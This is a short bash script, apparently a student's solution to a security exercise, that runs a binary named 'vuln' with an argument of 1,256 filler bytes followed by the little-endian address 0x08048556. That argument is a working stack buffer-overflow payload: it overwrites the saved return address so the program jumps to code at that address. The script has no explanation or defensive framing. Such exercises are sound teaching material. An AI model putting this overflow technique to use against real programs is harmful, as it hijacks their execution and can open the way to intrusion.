#!/usr/bin/env bash
/task2/s1813106/vuln "$(python -c "print('\xfd\xff' * 628 +'\x56\x85\x04\x08')")"
